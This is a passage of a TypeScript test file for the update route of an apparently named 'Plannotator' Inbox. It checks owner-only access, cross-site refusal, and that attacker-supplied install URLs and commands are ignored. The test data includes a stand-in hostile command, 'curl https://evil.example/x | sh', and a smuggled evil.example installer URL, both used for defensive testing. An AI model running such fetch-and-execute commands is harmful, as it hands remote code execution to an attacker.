      const onB = async () => ((await (await fetch(`http://127.0.0.1:${b.port}/api/inbox/threads/${asked.thread_id}`)).json()) as Json).thread as Json;
      const personOnB = async () => ((await onB()).messages as Json[]).filter((m) => m.author.kind === "person");
      /** The question's pick, at the revision the thread shows now. */
      const pickBody = async (key: string, selected: string) => {
        const question = ((await thread()).thread.messages[0].questions as Json[])[0]!;
        return { idempotency_key: key, questions: [{ key: question.key, revision: question.revision, answer: { v: 1, key: question.key, kind: "single", prompt: question.prompt, selected: [selected] } }] };
      };
      return { a, b, dataA, dataB, mini, asked, listener, sessionOf, throughServe, uploadThroughServe, thread, onB, personOnB, pickBody, stop };
    } catch (error) {
      await stop();
      throw error;
    }
  }

  const delivered = async (answer: Response) => [answer.status, answer.headers.get("x-plannotator-outbox")];

  test("Update on a linked machine: the owner from any path, never a guest, another site, the generic forward or the outbox", async () => {
    const w = await linkedPair("plannotator-machines-update-gates-", false);
    try {
      const { a, b, mini } = w;
      const route = `/api/inbox/machines/${mini}/update`;
      // A tailnet guest: refused, read and write.
      expect((await w.throughServe(GUEST, route)).status).toBe(403);
      const guest = await w.throughServe(GUEST, route, {});
      expect(guest.status).toBe(403);
      expect(((await guest.json()) as Json).code).toBe("owner_only");
      // The owner over the tailnet: it reaches that machine (a dev build here, so it answers that and runs nothing).
      const owner = await w.throughServe(OWNER, route, {});
      expect(owner.status).toBe(409);
      expect(((await owner.json()) as Json).code).toBe("update_dev_build");
      // A plain local call too.
      const local = await fetch(`http://127.0.0.1:${a.port}${route}`, { method: "POST", body: JSON.stringify({ serverSession: await w.sessionOf(a.port) }) });
      expect(local.status).toBe(409);
      // Another site's page, whatever it claims and however it posts.
      const base = `http://127.0.0.1:${a.port}`;
      for (const headers of [{ Origin: "https://evil.example" }, { Origin: "null" }, { "Sec-Fetch-Site": "cross-site" }, { Origin: "http://127.0.0.1:1", "Content-Type": "text/plain" }] as Record<string, string>[]) {
        const refused = await fetch(`${base}${route}`, { method: "POST", headers, body: JSON.stringify({ serverSession: await w.sessionOf(a.port) }) });
        expect(refused.status).toBe(403);
        // A read gets nothing either: that machine's facts stay with this window.
        const read = await fetch(`${base}${route}`, { headers });
        expect(read.status).toBe(403);
      }
      // A page on another site, through the tailnet, read and write.
      for (const body of [undefined, {}]) {
        const farPage = await w.throughServe(OWNER, route, body, { Origin: "https://evil.example", "Sec-Fetch-Site": "cross-site" });
        expect(farPage.status).toBe(403);
      }
      // A stale tab.
      const stale = await fetch(`${base}${route}`, { method: "POST", body: JSON.stringify({ serverSession: "old" }) });
      expect(stale.status).toBe(409);
      expect(((await stale.json()) as Json).code).not.toBe("update_dev_build");
      // Not through the generic forward or the outbox, for anyone.
      for (const method of ["GET", "POST"]) {
        const forwarded = await fetch(`${base}/api/inbox/m/${mini}/update`, { method, ...(method === "POST" ? { body: JSON.stringify({ serverSession: await w.sessionOf(a.port) }) } : {}) });
        expect(forwarded.status).toBe(404);
        expect(((await forwarded.json()) as Json).code).toBe("not_found");
      }
      expect(existsSync(join(w.dataA, "inbox", "outbox", `${mini}.jsonl`))).toBe(false);
      // What this window shows of that machine is only what it picked by name: no URL and no command from there.
      const details = (await (await fetch(`${base}${route}`)).json()) as Json;
      expect(Object.keys(details).sort()).toEqual(["command", "current", "failure", "log", "open_reviews", "platform", "update"]);
      expect(details.command).toContain("plannotator.ai/install");
      // An encoded name is not a way around the forward's refusal.
      expect((await fetch(`${base}/api/inbox/m/${mini}/%75pdate`)).status).toBe(404);
      void b;
    } finally {
      await w.stop();
    }
  });

  test("the press, end to end: the far machine installs its own answer whatever the body says, restarts itself, and this window hears each step", async () => {
    const root = realpathSync(mkdtempSync(join(tmpdir(), "plannotator-machines-update-press-")));
    roots.push(root);
    const home = join(root, "Users", "ramos");
    mkdirSync(home, { recursive: true });
    const binary = join(home, "plannotator");
    writeFileSync(binary, "old");
    const launches: { version: string; lockPath: string; resultPath: string }[] = [];
    let onDisk = "0.28.40";
    let restarts = 0;
    const answer = async () => ({ ok: true as const, release: { tag: "v0.28.42", body: "" } });
    // That machine's own check names the release, which needs its checks on.
    const checks = process.env.PLANNOTATOR_UPDATE_CHECK;
    delete process.env.PLANNOTATOR_UPDATE_CHECK;
    restore.push(() => {
      if (checks === undefined) delete process.env.PLANNOTATOR_UPDATE_CHECK;
      else process.env.PLANNOTATOR_UPDATE_CHECK = checks;
    });
    const w = await linkedPair("plannotator-machines-update-press-pair-", false, {
      dataDir: join(home, ".plannotator"),
      version: "0.28.40",
      binaryPath: binary,
      healthTickMs: 100,
      onRestartRequested: () => void restarts++,
      updates: {
        home,
        fetchRelease: answer,
        fetchReleasePage: answer,
        fetchReleaseTag: answer,
        isManaged: () => true,
        listSessions: () => [],
        probeVersion: async () => onDisk,
        launchInstaller: (launch) => void launches.push(launch),
      },
    });
    try {
      const base = `http://127.0.0.1:${w.a.port}`;
      const route = `/api/inbox/machines/${w.mini}/update`;
      const row = async () => ((await (await fetch(`${base}/api/inbox/machines`)).json()) as Json).machines.find((m: Json) => m.id === w.mini);
      await waitFor("the far machine behind", async () => (await row())?.update?.phase === "behind");
      expect((await row()).update).toMatchObject({ phase: "behind", target: "0.28.42", from: "0.28.40", can_update: true, self_update: true });
      // The dialog's read: the log as ~/…, with no name in any field.
      const details = await (await fetch(`${base}${route}`)).text();
      expect(JSON.parse(details).log.startsWith("~/")).toBe(true);
      expect(details).not.toContain("ramos");
      // A body naming another version and another place to download from.
      const pressed = await fetch(`${base}${route}`, {
        method: "POST",
        body: JSON.stringify({ serverSession: await w.sessionOf(w.a.port), version: "9.9.9", url: "https://evil.example/install.sh" }),
      });
      expect(await pressed.json()).toEqual({ ok: true, outcome: "launched" });
      expect(launches.map((launch) => launch.version)).toEqual(["v0.28.42"]);
      expect(existsSync(join(w.dataA, "inbox", "outbox", `${w.mini}.jsonl`))).toBe(false);
      await waitFor("updating on this window", async () => (await row())?.update?.phase === "updating");
      // The remembered flags reach the command this window shows.
      writeFileSync(join(home, ".plannotator", "install-flags.json"), JSON.stringify({ flags: ["skip-gemini"] }));
      expect(((await (await fetch(`${base}${route}`)).json()) as Json).command).toBe("curl -fsSL https://plannotator.ai/install.sh | bash -s -- --skip-gemini");
      // The second press, from another tab, joins it.
      const again = await fetch(`${base}${route}`, { method: "POST", body: JSON.stringify({ serverSession: await w.sessionOf(w.a.port) }) });
      expect(await again.json()).toEqual({ ok: true, outcome: "joined" });
      expect(launches).toHaveLength(1);
      // The binary is swapped and the install script runs on (skills, plugins): that machine reads ready, this window still says Updating, and nothing restarts.
      onDisk = "0.28.42";
      writeFileSync(binary, "new");
      await waitFor("the far machine ready", async () => ((await (await fetch(`http://127.0.0.1:${w.b.port}/api/inbox/health`)).json()) as Json).update?.state === "ready", 6_000);
      for (let i = 0; i < 10; i++) {
        expect((await row()).update).toMatchObject({ phase: "updating", target: "0.28.42", from: "0.28.40" });
        await Bun.sleep(50);
      }
      expect(restarts).toBe(0);
      // The install ends: the far Inbox restarts itself, once, with no window of its own open, and this window says so.
      writeFileSync(launches[0]!.resultPath, JSON.stringify({ version: "v0.28.42", exitCode: 0 }));
      rmSync(launches[0]!.lockPath, { force: true });
      await waitFor("the far machine restarting itself", () => restarts === 1, 6_000);
      expect(restarts).toBe(1);
      await waitFor("restarting on this window", async () => (await row())?.update?.phase === "restarting", 6_000);
      expect((await row()).update).toMatchObject({ target: "0.28.42", from: "0.28.40" });
    } finally {
      await w.stop();
    }
  });

  test("asleep: the press sends nothing and holds nothing, so nothing runs when the machine wakes", async () => {
    const w = await linkedPair("plannotator-machines-update-asleep-", false);
    try {
      const base = `http://127.0.0.1:${w.a.port}`;
      const row = async () => ((await (await fetch(`${base}/api/inbox/machines`)).json()) as Json).machines.find((m: Json) => m.id === w.mini);
      w.b.stop();
      await waitFor("the far machine away", async () => (await row())?.state !== "online");
      const asleep = await fetch(`${base}/api/inbox/machines/${w.mini}/update`, { method: "POST", body: JSON.stringify({ serverSession: await w.sessionOf(w.a.port) }) });
      expect(asleep.status).toBe(503);
      expect(((await asleep.json()) as Json).code).toBe("machine_offline");
      expect(existsSync(join(w.dataA, "inbox", "outbox", `${w.mini}.jsonl`))).toBe(false);
    } finally {
      await w.stop();
    }
  });

  test("a door that answers more than it should, and a press that says up to date: only what this window picked shows, and the word goes", async () => {
    const root = realpathSync(mkdtempSync(join(tmpdir(), "plannotator-machines-update-door-")));
    roots.push(root);
    const FAR = "ibx_01K00000000000000000000001";
    const posts: string[] = [];
    const door = Bun.serve({
      hostname: "127.0.0.1",
      port: 0,
      idleTimeout: 0,
      async fetch(req) {
        const route = new URL(req.url).pathname.replace("/api/inbox/device/", "");
        if (route === "health") return Response.json({ ok: true, inbox_id: FAR, machine_links: 1, machine_update: 1, self_update: true, version: "0.28.50", update: null });
        if (route === "threads") return Response.json({ cursor: 0, sections: [] });
        if (route === "events") return new Response(new ReadableStream({ start: (c) => c.enqueue(new TextEncoder().encode("event: hello\ndata: {\"cursor\":0}\n\n")) }), { headers: { "Content-Type": "text/event-stream" } });
        if (route === "update" && req.method === "POST") {
          posts.push(await req.text());
          return Response.json({ outcome: "up-to-date" });
        }
        if (route === "update") return Response.json({ current: "0.28.50", update: null, platform: "darwin", command: "curl https://evil.example/x | sh", log: "curl https://evil.example/x | sh", flags: ["--evil"], open_reviews: 0, failure: null });
        return Response.json({ code: "device_route_not_found" }, { status: 404 });
      },
    });
    const dataDir = join(root, "viewer");
    mkdirSync(dataDir, { recursive: true });
    InboxLinks.open(dataDir).put({ id: FAR, name: "Level", token: "tok", transport: { kind: "tailnet", url: `http://127.0.0.1:${door.port}` }, device_id: null, linked_at: "2026-11-01T00:00:00Z" });
    // This Inbox is a build ahead of GitHub's latest.
    const viewer = await startInboxServer({ dataDir, version: "0.28.60", binaryPath: null, phones: false, updates: { listSessions: () => [] } });
    try {
      const base = `http://127.0.0.1:${viewer.port}`;
      const route = `${base}/api/inbox/machines/${FAR}/update`;
      const row = async () => ((await (await fetch(`${base}/api/inbox/machines`)).json()) as Json).machines.find((m: Json) => m.id === FAR);
      await waitFor("the machine online and behind this one", async () => (await row())?.update?.phase === "behind");
      const details = await (await fetch(route)).text();
      expect(details).not.toContain("evil");
      expect(JSON.parse(details).command).toBe("curl -fsSL https://plannotator.ai/install.sh | bash");
      const session = ((await (await fetch(`${base}/api/inbox/health`)).json()) as Json).serverSession as string;
      const pressed = await fetch(route, { method: "POST", body: JSON.stringify({ serverSession: session }) });
      expect(pressed.status).toBe(409);
      expect(await pressed.json()).toEqual({ error: "Level is up to date.", code: "update_up_to_date" });
      expect(posts).toEqual(["{}"]);
      expect((await row()).update).toBeNull();
    } finally {
      viewer.stop();
      door.stop(true);
    }
  });

  test("an Inbox from before the route: the row says it cannot be updated from here, the read says too old, the press runs nothing", async () => {
    const root = realpathSync(mkdtempSync(join(tmpdir(), "plannotator-machines-update-old-")));
    roots.push(root);
    const OLD = "ibx_01K00000000000000000000000";
    const posts: string[] = [];
    // A door as 0.28.44's: its health, its list, and a 404 for `update`.
    const door = Bun.serve({
      hostname: "127.0.0.1",
      port: 0,
      idleTimeout: 0,
      fetch(req) {
        const route = new URL(req.url).pathname.replace("/api/inbox/device/", "");
        if (req.method === "POST") posts.push(route);
        if (route === "health") return Response.json({ ok: true, inbox_id: OLD, machine_links: 1, version: "0.28.44" });
        if (route === "threads") return Response.json({ cursor: 0, sections: [] });
        if (route === "events") return new Response(new ReadableStream({ start: (c) => c.enqueue(new TextEncoder().encode("event: hello\ndata: {\"cursor\":0}\n\n")) }), { headers: { "Content-Type": "text/event-stream" } });
        return Response.json({ code: "device_route_not_found" }, { status: 404 });
      },
    });
    const dataDir = join(root, "viewer");
    mkdirSync(dataDir, { recursive: true });
    InboxLinks.open(dataDir).put({ id: OLD, name: "Mac mini", token: "tok", transport: { kind: "tailnet", url: `http://127.0.0.1:${door.port}` }, device_id: null, linked_at: "2026-11-01T00:00:00Z" });
    const viewer = await startInboxServer({ dataDir, version: "0.28.60", binaryPath: null, phones: false, updates: { listSessions: () => [] } });
    try {
      const base = `http://127.0.0.1:${viewer.port}`;
      const row = async () => ((await (await fetch(`${base}/api/inbox/machines`)).json()) as Json).machines.find((m: Json) => m.id === OLD);
      await waitFor("the older machine online", async () => (await row())?.state === "online");
      expect((await row()).update).toMatchObject({ phase: "behind", target: "0.28.60", from: "0.28.44", can_update: false });
      const session = ((await (await fetch(`${base}/api/inbox/health`)).json()) as Json).serverSession as string;
      expect(await (await fetch(`${base}/api/inbox/machines/${OLD}/update`)).json()).toEqual({ too_old: true, current: "0.28.44" });
      const pressed = await fetch(`${base}/api/inbox/machines/${OLD}/update`, { method: "POST", body: JSON.stringify({ serverSession: session }) });
      expect(pressed.status).toBe(409);
      expect(((await pressed.json()) as Json).code).toBe("machine_too_old");
      expect(existsSync(join(dataDir, "inbox", "outbox", `${OLD}.jsonl`))).toBe(false);
    } finally {
      viewer.stop();
      door.stop(true);
    }
  });

  test("where Tailscale names no owner (a tagged machine), a login let on is treated as you: Update is never refused", async () => {
    const w = await linkedPair("plannotator-machines-update-tagged-", true);
    try {
      const answer = await w.throughServe(GUEST, `/api/inbox/machines/${w.mini}/update`, {});
      expect(answer.status).toBe(409);
      expect(((await answer.json()) as Json).code).toBe("update_dev_build");
    } finally {
      await w.stop();
    }
  });

  test("a phone's token does not reach `update` on the door, read or write", async () => {
    const root = realpathSync(mkdtempSync(join(tmpdir(), "plannotator-machines-update-phone-")));
    roots.push(root);
    // Pairing also asks for a mailbox: never the real relay.
    const relayUrl = process.env.PLANNOTATOR_RELAY_URL;
    process.env.PLANNOTATOR_RELAY_URL = "http://127.0.0.1:9";
    restore.push(() => {
      if (relayUrl === undefined) delete process.env.PLANNOTATOR_RELAY_URL;
      else process.env.PLANNOTATOR_RELAY_URL = relayUrl;
    });
    const inbox = await startInboxServer({ dataDir: join(root, "d"), binaryPath: null, phones: true, tailscale: ownedTailscale().run });
    try {
      const base = `http://127.0.0.1:${inbox.port}`;
      const made = (await (await fetch(`${base}/api/inbox/pairing`, { method: "POST", body: "{}" })).json()) as Json;
      const paired = await fetch(`${base}/api/inbox/device/pair`, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ code: made.offer.code, name: "iPhone", platform: "ios" }) });
      const { token } = (await paired.json()) as { token: string };
      for (const method of ["GET", "POST"]) {
        const refused = await fetch(`${base}/api/inbox/device/update`, { method, headers: { Authorization: `Bearer ${token}`, "Content-Type": "application/json" }, ...(method === "POST" ? { body: "{}" } : {}) });
        expect(refused.status).toBe(404);
        expect(((await refused.json()) as Json).code).toBe("device_route_not_found");
      }
    } finally {
      inbox.stop();
    }
  });

  test("a tailnet guest of this machine never writes to a linked machine, though it reads; the owner writes from every path: this window, another device, a plain local call", async () => {
    const w = await linkedPair("plannotator-machines-forward-owner-", false);
    try {
      const { a, mini, asked } = w;
      // Reads through the forward stay as they are, for the guest too.
      const read = await w.throughServe(GUEST, `/api/inbox/m/${mini}/threads/${asked.thread_id}`);
      expect(read.status).toBe(200);
      const cursor = ((await read.json()) as Json).cursor as number;

      // The guest, from A's own page: every write to B is refused, and none reaches B.
      for (const [route, body] of [
        [`messages/${asked.message_id}/reply`, { idempotency_key: "guest-reply", words: "Guest says retry.", seen_through_seq: cursor }],
        [`messages/${asked.message_id}/picks`, await w.pickBody("guest-pick", "Retry")],
        [`threads/${asked.thread_id}/read`, { idempotency_key: "guest-read" }],
        [`threads/${asked.thread_id}/snooze`, { idempotency_key: "guest-snooze", until: tomorrow() }],
      ] as const) {
        const answer = await w.throughServe(GUEST, `/api/inbox/m/${mini}/${route}`, body);
        expect([route, answer.status, ((await answer.json()) as Json).code]).toEqual([route, 403, "owner_only"]);
      }
      const upload = await w.uploadThroughServe(GUEST, "guest-up");
      expect([upload.status, ((await upload.json()) as Json).code]).toEqual([403, "owner_only"]);
      expect(await w.personOnB()).toHaveLength(0);
      expect(((await w.onB()).messages[0].questions as Json[])[0]!.state).toBe("open");
      expect(existsSync(join(w.dataA, "inbox", "outbox", `${mini}.jsonl`))).toBe(false);

      // The owner keeps everything through the forward, each answer delivered to B once.
      // The owner's window on this machine.
      const local = await fetch(`http://127.0.0.1:${a.port}/api/inbox/m/${mini}/messages/${asked.message_id}/reply`, {
        method: "POST",
        headers: { "Content-Type": "application/json", Origin: `http://127.0.0.1:${a.port}` },
        body: JSON.stringify({ serverSession: await w.sessionOf(a.port), idempotency_key: "owner-local", words: "From the MacBook's window.", seen_through_seq: (await w.thread()).cursor }),
      });
      expect(await delivered(local)).toEqual([200, "delivered"]);
      // The owner's window on another of their devices over the tailnet (the same login): a reply, a mark read, a file.
      const remote = await w.throughServe(OWNER, `/api/inbox/m/${mini}/messages/${asked.message_id}/reply`, {
        idempotency_key: "owner-tailnet",
        words: "From the owner's phone browser.",
        seen_through_seq: (await w.thread()).cursor,
      });
      expect(await delivered(remote)).toEqual([200, "delivered"]);
      expect(await delivered(await w.throughServe(OWNER, `/api/inbox/m/${mini}/threads/${asked.thread_id}/read`, { idempotency_key: "owner-tailnet-read" }))).toEqual([200, "delivered"]);
      expect((await w.uploadThroughServe(OWNER, "owner-up")).status).toBe(200);
      // A plain local call with no Origin and no page session (an agent, a script, the CLI on this machine): a reply and a file.
      const bare = await fetch(`http://127.0.0.1:${a.port}/api/inbox/m/${mini}/messages/${asked.message_id}/reply`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ idempotency_key: "owner-bare", words: "From a script on the MacBook.", seen_through_seq: (await w.thread()).cursor }),
      });
      expect(await delivered(bare)).toEqual([200, "delivered"]);
      const bareUpload = await fetch(`http://127.0.0.1:${a.port}/api/inbox/m/${mini}/uploads?name=bare.txt&idempotency_key=owner-bare-up`, {
        method: "POST",
        headers: { "Content-Type": "text/plain" },
        body: "from a script",
      });
      expect(bareUpload.status).toBe(200);
      const landed = (await w.personOnB()).map((m) => m.body as string);
      expect(landed).toHaveLength(3);
      expect(landed[0]).toStartWith("From the MacBook's window.");
      expect(landed[1]).toStartWith("From the owner's phone browser.");
      expect(landed[2]).toStartWith("From a script on the MacBook.");
    } finally {
      await w.stop();
    }
  }, 60_000);

  test("on a tagged machine (no Tailscale owner), the login its allowlist names is the owner: it picks, replies, snoozes and uploads through the forward", async () => {
    const w = await linkedPair("plannotator-machines-forward-tagged-", true);
    try {
      const { mini, asked } = w;
      expect(await delivered(await w.throughServe(GUEST, `/api/inbox/m/${mini}/messages/${asked.message_id}/picks`, await w.pickBody("tagged-pick", "Alert")))).toEqual([
        200,
        "delivered",
      ]);
      expect(((await w.onB()).messages[0].questions as Json[])[0]!.state).toBe("picked");
      const reply = await w.throughServe(GUEST, `/api/inbox/m/${mini}/messages/${asked.message_id}/reply`, {
        idempotency_key: "tagged-reply",
        words: "From the tagged machine's only user.",
        seen_through_seq: (await w.thread()).cursor,
      });
      expect(await delivered(reply)).toEqual([200, "delivered"]);
      expect(await delivered(await w.throughServe(GUEST, `/api/inbox/m/${mini}/threads/${asked.thread_id}/snooze`, { idempotency_key: "tagged-snooze", until: tomorrow() }))).toEqual([
        200,
        "delivered",
      ]);
      expect((await w.uploadThroughServe(GUEST, "tagged-up")).status).toBe(200);
      const landed = await w.personOnB();
      expect(landed).toHaveLength(1);
      expect(landed[0]!.body).toStartWith("From the tagged machine's only user.");
      // A login the allowlist does not name is still refused at the listener.
      const stranger = await w.throughServe("someone@example.com", `/api/inbox/m/${mini}/threads/${asked.thread_id}/read`, { idempotency_key: "stranger-read" });
      expect(stranger.status).toBe(403);
    } finally {
      await w.stop();
    }
  }, 60_000);
});
